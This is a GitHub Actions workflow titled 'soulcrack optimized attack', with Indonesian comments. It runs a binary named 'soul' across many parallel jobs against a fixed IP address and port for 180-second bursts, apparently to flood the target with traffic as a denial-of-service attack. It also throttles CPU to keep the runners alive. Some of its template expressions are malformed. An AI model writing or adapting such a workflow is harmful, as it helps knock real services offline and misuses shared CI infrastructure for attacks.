name: soulcrack optimized attack
on: 
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  # Pre-job untuk persiapan
  setup:
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v3
      - name: Setup environment
        run: |
          chmod +x soul
          echo "Attack target: 34.0.14.87:23928 for 180s"

  # Main attack dengan parallel jobs optimized
  attack-main:
    needs: setup
    runs-on: ubuntu-22.04
    strategy:
      fail-fast: false
      max-parallel: 8  # Optimized parallel jobs
      matrix:
        batch: [1, 2, 3, 4, 5, 6, 7, 8]
    steps:
      - uses: actions/checkout@v3
      - name: Attack Phase {{ matrix.batch }}
        run: |
          chmod +x soul
          # CPU affinity and nice to manage CPU usage
          taskset -c $(({{ matrix.batch % 2 } + 1)) ./soul 34.0.14.87 23928 180 400 &
          sleep 2
          # Limit CPU usage to ~50% by alternating cores
          while kill -0 $! 2>/dev/null; do
            for cpu in 0 1; do
              taskset -p $cpu $! 2>/dev/null || true
              sleep 5
            done
          done

  # Additional load with controlled CPU
  attack-secondary:
    needs: setup
    runs-on: ubuntu-22.04
    strategy:
      fail-fast: false
      max-parallel: 4  # Reduced parallel for CPU management
      matrix:
        wave: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v3
      - name: Secondary Wave {{ matrix.wave }}
        run: |
          chmod +x soul
          # Run with lower priority
          nice -n 10 ./soul 34.0.14.87 23928 180 400 &
          PID=$!
          # Monitor and adjust CPU
          while kill -0 $PID 2>/dev/null; do
            # Limit to 50% by alternating between pause and run
            sleep 2
            kill -STOP $PID 2>/dev/null
            sleep 2
            kill -CONT $PID 2>/dev/null
          done

  # Continuous monitoring and traffic
  sustain:
    needs: [attack-main, attack-secondary]
    runs-on: ubuntu-22.04
    if: always()
    steps:
      - uses: actions/checkout@v3
      - name: Sustain Attack
        run: |
          chmod +x soul
          END=$((SECONDS+180))
          while [ $SECONDS -lt $END ]; do
            # Start multiple instances but with CPU control
            for i in 1 2; do
              taskset -c 0 nice -n 5 ./soul 34.0.14.87 23928 5 400 > /dev/null 2>&1 &
              sleep 1
              taskset -c 1 nice -n 5 ./soul 34.0.14.87 23928 5 400 > /dev/null 2>&1 &
            done
            sleep 3
            # Kill all after each cycle to prevent CPU spikes
            pkill -f soul || true
            sleep 2
          done
